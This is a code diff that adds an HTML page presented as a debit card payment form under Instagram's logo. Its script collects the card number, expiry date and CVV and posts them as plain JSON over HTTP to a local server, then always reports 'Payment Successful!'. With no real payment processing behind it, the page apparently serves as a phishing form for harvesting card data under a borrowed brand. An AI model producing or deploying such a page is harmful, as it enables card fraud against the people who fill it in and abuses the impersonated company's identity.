@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+   <meta charset="UTF-8">
+   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+   <title>Debit Card Payment</title>
+   <style>
+       body {
+           font-family: Arial, sans-serif;
+           background-color: #fafafa;
+           display: flex;
+           justify-content: center;
+           align-items: center;
+           height: 100vh;
+           margin: 0;
+       }
+       .container {
+           background-color: white;
+           border-radius: 5px;
+           width: 350px;
+           padding: 40px 30px;
+           box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
+           text-align: center;
+       }
+       .header {
+           display: flex;
+           align-items: center;
+           justify-content: center;
+       }
+       .logo {
+           width: 30px;
+           margin-right: 10px;
+       }
+       h2 {
+           margin: 0;
+           font-size: 24px;
+       }
+       .input-field {
+           width: 100%;
+           padding: 10px;
+           margin: 10px 0;
+           border: 1px solid #dbdbdb;
+           border-radius: 5px;
+           box-sizing: border-box;
+       }
+       .submit-btn {
+           width: 100%;
+           padding: 10px;
+           background-color: #3897f0;
+           color: white;
+           border: none;
+           border-radius: 5px;
+           cursor: pointer;
+           font-size: 14px;
+       }
+       .submit-btn:hover {
+           background-color: #2980b9;
+       }
+   </style>
+</head>
+<body>
+<div class="container">
+   <div class="header">
+       <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Logo" class="logo">
+       <h2>Payment Form</h2>
+   </div>
+   <form id="paymentForm">
+       <input type="text" class="input-field" name="cardNumber" placeholder="Card Number" required>
+       <input type="text" class="input-field" name="expiryDate" placeholder="Expiry Date (MM/YY)" required>
+       <input type="text" class="input-field" name="cvv" placeholder="CVV" required>
+       <button type="submit" class="submit-btn">Pay Now</button>
+   </form>
+</div>
+
+<script>
+   document.getElementById("paymentForm").addEventListener("submit", function(event) {
+       event.preventDefault();
+
+       const cardNumber = document.querySelector("[name='cardNumber']").value;
+       const expiryDate = document.querySelector("[name='expiryDate']").value;
+       const cvv = document.querySelector("[name='cvv']").value;
+
+       const data = { cardNumber, expiryDate, cvv };
+
+       fetch('http://localhost:8000/submit', {
+           method: 'POST',
+           headers: { 'Content-Type': 'application/json' },
+           body: JSON.stringify(data),
+       })
+       .then(response => response.json())
+       .then(data => {
+           console.log('Success:', data);
+           alert('Payment Successful!');
+       })
+       .catch(error => {
+           console.error('Error:', error);
+           alert('Payment Failed');
+       });
+   });
+</script>
+</body>
+</html>
